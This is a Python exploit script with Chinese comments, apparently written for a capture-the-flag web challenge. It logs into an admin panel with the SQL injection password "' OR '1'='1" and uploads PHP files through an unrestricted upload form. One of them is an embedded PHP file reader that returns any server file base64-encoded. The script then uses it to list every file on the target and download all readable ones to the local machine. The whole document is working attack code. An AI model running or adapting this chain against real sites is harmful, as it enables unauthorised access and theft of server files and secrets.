import requests
import json
import os
from pathlib import Path

base_url = "http://challenge.bluesharkinfo.com:28343"
login_url = f"{base_url}/admin/login.php"
upload_url = f"{base_url}/upload.php"

# 创建输出目录
output_dir = "server_source"
os.makedirs(output_dir, exist_ok=True)

# 创建session
session = requests.Session()

# 登录
print("=" * 60)
print("登录中...")
print("=" * 60)
data = {
    'username': 'admin',
    'password': "' OR '1'='1"
}
resp = session.post(login_url, data=data)
print(f"登录状态: {resp.status_code}")

# 上传文件列表脚本
print("\n" + "=" * 60)
print("上传 download_source.php...")
print("=" * 60)
files = {
    'shell': ('download_source.php', open('download_source.php', 'rb'), 'application/x-php')
}
resp = session.post(upload_url, files=files)
print(f"上传状态: {resp.status_code}")

# 获取文件列表
print("\n" + "=" * 60)
print("获取服务器文件列表...")
print("=" * 60)
resp = session.get(f"{base_url}/download_source.php")
file_list = resp.json()

if not file_list.get('success'):
    print("获取文件列表失败!")
    exit(1)

print(f"找到 {file_list['count']} 个文件")

# 创建下载脚本
download_script = """<?php
$file = $_GET['file'] ?? '';
if(empty($file) || !file_exists($file)) {
    die('File not found');
}
if(!is_readable($file)) {
    die('File not readable');
}
echo base64_encode(file_get_contents($file));
?>"""

print("\n" + "=" * 60)
print("上传下载脚本...")
print("=" * 60)
files = {
    'shell': ('downloader.php', download_script.encode(), 'application/x-php')
}
resp = session.post(upload_url, files=files)
print(f"上传状态: {resp.status_code}")

# 下载所有文件
print("\n" + "=" * 60)
print("开始下载文件...")
print("=" * 60)

downloaded = 0
skipped = 0
errors = 0

for file_info in file_list['files']:
    file_path = file_info['path']
    relative_path = file_info['relative']
    size = file_info['size']
    readable = file_info['readable']
    
    if not readable:
        print(f"[跳过] {relative_path} (不可读)")
        skipped += 1
        continue
    
    # 跳过太大的文件 (>10MB)
    if size and size > 10 * 1024 * 1024:
        print(f"[跳过] {relative_path} (文件太大: {size/1024/1024:.2f}MB)")
        skipped += 1
        continue
    
    try:
        # 下载文件内容
        resp = session.get(f"{base_url}/downloader.php?file={file_path}")
        if resp.status_code == 200 and resp.text and resp.text != 'File not found' and resp.text != 'File not readable':
            import base64
            content = base64.b64decode(resp.text)
            
            # 保存到本地
            local_path = os.path.join(output_dir, relative_path)
            os.makedirs(os.path.dirname(local_path), exist_ok=True)
            
            with open(local_path, 'wb') as f:
                f.write(content)
            
            print(f"[下载] {relative_path} ({len(content)} bytes)")
            downloaded += 1
        else:
            print(f"[错误] {relative_path} - {resp.text[:50]}")
            errors += 1
    except Exception as e:
        print(f"[异常] {relative_path} - {str(e)}")
        errors += 1

print("\n" + "=" * 60)
print("下载完成!")
print("=" * 60)
print(f"成功下载: {downloaded} 个文件")
print(f"跳过: {skipped} 个文件")
print(f"错误: {errors} 个文件")
print(f"文件保存在: {os.path.abspath(output_dir)}")
